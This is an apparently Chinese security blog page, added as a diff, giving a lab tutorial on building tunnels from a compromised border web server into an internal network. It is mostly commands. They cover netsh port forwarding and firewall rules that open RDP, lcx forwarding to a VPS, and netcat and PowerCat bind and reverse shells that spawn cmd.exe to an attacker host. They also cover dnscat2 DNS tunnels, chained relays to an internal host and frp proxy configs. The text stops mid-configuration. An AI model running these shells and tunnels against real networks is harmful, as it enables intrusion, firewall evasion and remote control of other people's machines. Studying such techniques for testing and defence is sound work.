@@ -1,0 +1,783 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/bg/6.png">
+  <link rel="icon" href="/img/bg/6.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="海马少年">
+  <meta name="keywords" content="">
+  <meta name="description" content="内网隧道搭建实践netsh隧道搭建  跳板机：win7    内网主机：Centos 7 场景一利用边界的被拿下的web服务器建立端口转发规则，使问利用web服务器作为跳板与内网主机建立联系  在win7中执行：netsh interface portproxy add v4tov4 listenport&#x3D;4567 connectaddress&#x3D;10.10.3.129 connectport&#x3D;22">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网隧道搭建">
+<meta property="og:url" content="http://example.com/2021/10/13/%E5%86%85%E7%BD%91%E9%9A%A7%E9%81%93%E6%90%AD%E5%BB%BA/index.html">
+<meta property="og:site_name" content="Lcdm123">
+<meta property="og:description" content="内网隧道搭建实践netsh隧道搭建  跳板机：win7    内网主机：Centos 7 场景一利用边界的被拿下的web服务器建立端口转发规则，使问利用web服务器作为跳板与内网主机建立联系  在win7中执行：netsh interface portproxy add v4tov4 listenport&#x3D;4567 connectaddress&#x3D;10.10.3.129 connectport&#x3D;22">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805091644761.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804114121495.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805091741766.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804142654140.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805091809826.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804143305962.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804143224155.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805091925952.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804145253006.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804145741200.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805091942498.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804155833809.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805091945928.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804160206174.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805092300471.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804162355288.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804162932809.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804163057542.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804163157341.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805092357659.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804171831544.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804171903589.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804171720544.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805092426042.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804172742238.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804172718398.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804172759548.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210804172833678.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805101242047.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805101810242.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805101013784.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805102024585.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805100948602.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805114923729.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805114755986.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805114714780.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805114604466.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805114411169.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805114320315.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805130313193.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805131042550.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805130844477.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805131203118.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805133050867.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805132433015.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805132401981.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805132209244.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805132241110.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805135020239.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805140125688.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805140156398.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805140253519.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805140008622.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210806093956906.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210806094624888.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210806094746686.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210806094918799.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210806095050984.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210907145149529.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210907150908264.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210917140954098.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210917143113458.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210917143151144.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210917143228545.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210917142735471.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210917152142891.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210917152234610.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210917152258505.png">
+<meta property="og:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210917152624930.png">
+<meta property="article:published_time" content="2021-10-13T11:01:14.000Z">
+<meta property="article:modified_time" content="2021-10-13T11:02:02.251Z">
+<meta property="article:author" content="海马少年">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://gitee.com/lcdm123/image/raw/master/image-20210805091644761.png">
+  
+  <title>内网隧道搭建 - Lcdm123</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":70,"cursorChar":"*","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname"}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Lcdm123" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>海马少年</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/bg/6.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="内网隧道搭建">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-10-13 19:01" pubdate>
+        2021年10月13日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      6.1k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      19 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">内网隧道搭建</h1>
+            
+            <div class="markdown-body">
+              <h1 id="内网隧道搭建实践"><a href="#内网隧道搭建实践" class="headerlink" title="内网隧道搭建实践"></a>内网隧道搭建实践</h1><h2 id="netsh隧道搭建"><a href="#netsh隧道搭建" class="headerlink" title="netsh隧道搭建"></a>netsh隧道搭建</h2><p>  跳板机：win7    内网主机：Centos 7</p>
+<h3 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a>场景一</h3><p>利用边界的被拿下的web服务器建立端口转发规则，使问利用web服务器作为跳板与内网主机建立联系</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091644761.png" srcset="/img/loading.gif" lazyload alt="image-20210805091644761"></p>
+<p>在win7中执行：<code>netsh interface portproxy add v4tov4 listenport=4567 connectaddress=10.10.3.129 connectport=22</code>（需要管理员权限）</p>
+<p>查看是否开启：<code>netsh interface portproxy show all</code></p>
+<p>删除规则：<code>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4567</code></p>
+<p>测试端口转发结果，连接成功</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804114121495.png" srcset="/img/loading.gif" lazyload alt="image-20210804114121495"></p>
+<h3 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a>场景二</h3><p>本地防火墙只允许某些端口出网，可以利用netsh搭建本地端口转发，将不允许出网的端口转发到白名单端口上<code>netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=12345 connectaddress=127.0.0.1 connectport=3389</code></p>
+<p>或者利用netsh操作本地的防火墙设置</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-builtin-name">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;openRDP&quot;</span> <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow  # 开放防火墙端口<br>netsh advfirewall<span class="hljs-built_in"> firewall </span>delete rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;openRDP&quot;</span> <span class="hljs-attribute">protocol</span>=tcp <span class="hljs-attribute">localport</span>=3389 #删除规则<br></code></pre></td></tr></table></figure>
+
+<h2 id="LCX端口代理"><a href="#LCX端口代理" class="headerlink" title="LCX端口代理"></a>LCX端口代理</h2><p>Windows的为lcx.exe，Linux的为portmap（这个工具有点老了）</p>
+<p>下载：<a target="_blank" rel="noopener" href="https://github.com/UndefinedIdentifier/LCX">https://github.com/UndefinedIdentifier/LCX</a></p>
+<h3 id="本地端口转发"><a href="#本地端口转发" class="headerlink" title="本地端口转发"></a>本地端口转发</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091741766.png" srcset="/img/loading.gif" lazyload alt="image-20210805091741766"></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl">windows：lcx.exe -slave vps-ip vps-port  <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> port 本地端口转发到VPS<br>lcx.exe -slave <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> <span class="hljs-number">5234</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> <span class="hljs-number">3389</span><br>lcx.exe -<span class="hljs-section">listen</span> <span class="hljs-number">5234</span> <span class="hljs-number">33891</span><br></code></pre></td></tr></table></figure>
+
+<p>将本地端口转发到VPS上</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804142654140.png" srcset="/img/loading.gif" lazyload alt="image-20210804142654140"></p>
+<blockquote>
+<p>可能是工具太老了，连接上一会就自动断开了</p>
+</blockquote>
+<h3 id="内网主机端口转发"><a href="#内网主机端口转发" class="headerlink" title="内网主机端口转发"></a>内网主机端口转发</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091809826.png" srcset="/img/loading.gif" lazyload alt="image-20210805091809826"></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lsl">web服务器上：Lcx.exe -slave  vps-ip  vps-port  内网主机ip  内网主机目标端口<br>Lcd.exe -slave <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> <span class="hljs-number">5234</span> <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.6</span> <span class="hljs-number">22</span><br><br>vps：Lcx.exe -<span class="hljs-section">listen</span> vps-port 内网主机目标端口<br>Lcx.exe -<span class="hljs-section">listen</span> <span class="hljs-number">5234</span> <span class="hljs-number">221</span><br></code></pre></td></tr></table></figure>
+
+<p>VPS与web服务器建立通道，将内网主机端口转发到VPS上</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804143305962.png" srcset="/img/loading.gif" lazyload alt="image-20210804143305962"></p>
+<p>利用通道连接到内网主机</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804143224155.png" srcset="/img/loading.gif" lazyload alt="image-20210804143224155"></p>
+<h2 id="NetCat代理"><a href="#NetCat代理" class="headerlink" title="NetCat代理"></a>NetCat代理</h2><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091925952.png" srcset="/img/loading.gif" lazyload alt="image-20210805091925952"></p>
+<h3 id="正向shell"><a href="#正向shell" class="headerlink" title="正向shell"></a>正向shell</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">web</span>服务器：nc<span class="hljs-number">64</span>.exe -lvp <span class="hljs-number">4445</span> -e c:\Windows\System<span class="hljs-number">32</span>\cmd.exe  监听连接请求<br><span class="hljs-attribute">VPS</span>：nc<span class="hljs-number">64</span>.exe web-ip <span class="hljs-number">4445</span>  请求连接<br></code></pre></td></tr></table></figure>
+
+<p>连接成功获取到shell</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804145253006.png" srcset="/img/loading.gif" lazyload alt="image-20210804145253006"></p>
+<h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">web服务器：nc64.exe vps-ip vps-port -e c:\Windows\System32\cmd.exe<br>VPS：nc64.exe -lvp<span class="hljs-built_in"> port </span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804145741200.png" srcset="/img/loading.gif" lazyload alt="image-20210804145741200"></p>
+<blockquote>
+<p>个人觉得不用太纠结正反，能连上就可以了 =_=</p>
+</blockquote>
+<h2 id="PowerCat代理"><a href="#PowerCat代理" class="headerlink" title="PowerCat代理"></a>PowerCat代理</h2><blockquote>
+<p>PowerCat 是nc的powershell版 ，使用方法和nc差不多</p>
+</blockquote>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">上传到web服务器中，然后修改服务器powershell策略并导入脚本<br><span class="hljs-keyword">Set</span>-ExecutionPolicy remotesigned <br><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powercat.ps1<br></code></pre></td></tr></table></figure>
+
+<h3 id="正向连接shell"><a href="#正向连接shell" class="headerlink" title="正向连接shell"></a>正向连接shell</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091942498.png" srcset="/img/loading.gif" lazyload alt="image-20210805091942498"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PowerCat</span>：powercat -l -p <span class="hljs-number">6666</span> -e cmd.exe -v<br><span class="hljs-attribute">vps</span>：nc<span class="hljs-number">64</span>.exe web-ip <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804155833809.png" srcset="/img/loading.gif" lazyload alt="image-20210804155833809"></p>
+<h3 id="反向连接shell"><a href="#反向连接shell" class="headerlink" title="反向连接shell"></a>反向连接shell</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805091945928.png" srcset="/img/loading.gif" lazyload alt="image-20210805091945928"></p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">PowerCat：powercat -c <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.7</span> -p <span class="hljs-number">6666</span> -e cmd.exe -v<br>vps：nc64.exe -lvp <span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804160206174.png" srcset="/img/loading.gif" lazyload alt="image-20210804160206174"></p>
+<h3 id="搭建DNS隧道"><a href="#搭建DNS隧道" class="headerlink" title="搭建DNS隧道"></a>搭建DNS隧道</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092300471.png" srcset="/img/loading.gif" lazyload alt="image-20210805092300471"></p>
+<blockquote>
+<p>PowerCat的DNS通信是基于<code>dnscat</code>设计的，在使用<code>dnscat</code>之前需要下载和进行编译</p>
+</blockquote>
+<p>Kali下载dnscat2</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/iagox86/</span>dnscat2.git<br>cd dnscat2<span class="hljs-regexp">/server/</span><br>gem install bundler<br>bundle install<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804162355288.png" srcset="/img/loading.gif" lazyload alt="image-20210804162355288"></p>
+<p>kali执行：<code>ruby dnscat2.rb ttpowercat.test -e open --no-cache</code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804162932809.png" srcset="/img/loading.gif" lazyload alt="image-20210804162932809"></p>
+<p>web主机：<code>powercat -c kali-ip -p 53 -dns ttpowercat.test -e cmd.exe </code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804163057542.png" srcset="/img/loading.gif" lazyload alt="image-20210804163057542"></p>
+<p>kali执行：<code>session -i 1</code></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804163157341.png" srcset="/img/loading.gif" lazyload alt="image-20210804163157341"></p>
+<p>搭建成功</p>
+<h3 id="跳板NC隧道"><a href="#跳板NC隧道" class="headerlink" title="跳板NC隧道"></a>跳板NC隧道</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092357659.png" srcset="/img/loading.gif" lazyload alt="image-20210805092357659"></p>
+<p>将域控制器交互到kali</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">内网主机：powercat -l -v -p <span class="hljs-number">9999</span> -e cmd.exe<br>web服务器：powercat -l -v -p <span class="hljs-number">2345</span> -r tcp:内网主机ip:<span class="hljs-number">9999</span><br>kali：nc web-ip <span class="hljs-number">2345</span> -vv<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171831544.png" srcset="/img/loading.gif" lazyload alt="image-20210804171831544"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171903589.png" srcset="/img/loading.gif" lazyload alt="image-20210804171903589"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804171720544.png" srcset="/img/loading.gif" lazyload alt="image-20210804171720544"></p>
+<h3 id="跳板DNS隧道"><a href="#跳板DNS隧道" class="headerlink" title="跳板DNS隧道"></a>跳板DNS隧道</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805092426042.png" srcset="/img/loading.gif" lazyload alt="image-20210805092426042"></p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">web</span>服务器：<span class="hljs-selector-tag">powercat</span> <span class="hljs-selector-tag">-l</span> <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">-p</span> 8000 <span class="hljs-selector-tag">-r</span> <span class="hljs-selector-tag">dns</span><span class="hljs-selector-pseudo">:kali-ip</span><span class="hljs-selector-pseudo">::ttpowercat.test</span><br><span class="hljs-selector-tag">kali</span>：<span class="hljs-selector-tag">ruby</span> <span class="hljs-selector-tag">dnscat2</span><span class="hljs-selector-class">.rb</span> <span class="hljs-selector-tag">ttpowercat</span><span class="hljs-selector-class">.test</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">open</span> <span class="hljs-selector-tag">--no-cache</span><br>内网：<span class="hljs-selector-tag">powercat</span> <span class="hljs-selector-tag">-c</span> 10<span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.3</span><span class="hljs-selector-class">.131</span> <span class="hljs-selector-tag">-p</span> 8000 <span class="hljs-selector-tag">-v</span> <span class="hljs-selector-tag">-e</span> <span class="hljs-selector-tag">cmd</span><span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172742238.png" srcset="/img/loading.gif" lazyload alt="image-20210804172742238"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172718398.png" srcset="/img/loading.gif" lazyload alt="image-20210804172718398"></p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172759548.png" srcset="/img/loading.gif" lazyload alt="image-20210804172759548"></p>
+<p>获取到shell</p>
+<p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210804172833678.png" srcset="/img/loading.gif" lazyload alt="image-20210804172833678"></p>
+<h2 id="frp内网穿透"><a href="#frp内网穿透" class="headerlink" title="frp内网穿透"></a>frp内网穿透</h2><p>下载：<a target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
+<p>frp 是一个专注于内网穿透的高性能的反向代理应用，支持 TCP、UDP、HTTP、HTTPS 等多种协议。可以将内网服务以安全、便捷的方式通过具有公网 IP 节点的中转暴露到公网。frp和端口转发并不是一样的，这样的frp是使用了内网的全端口全流量的</p>
+<h3 id="一级代理"><a href="#一级代理" class="headerlink" title="一级代理"></a>一级代理</h3><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20210805101242047.png" srcset="/img/loading.gif" lazyload alt="image-20210805101242047"></p>
+<p>利用win10作为服务端，Web作为客户端搭建内网代理</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Windows10<br><span class="hljs-comment"># frps.ini</span><br>[common]<br>bind_port = 7000<br>执行开启命令<br>frps.exe -c frpc.ini<br><br>web服务器<br><span class="hljs-comment"># frpc.ini</span><br>[common]<br>server_addr = 192.168.1.7 # VPS ip<br>server_port = 7000 # 与服务器端口对应<br>[http_proxy]<br><span class="hljs-attribute">type</span>=tcp<br><span class="hljs-attribute">remote_port</span>=2345<br><span 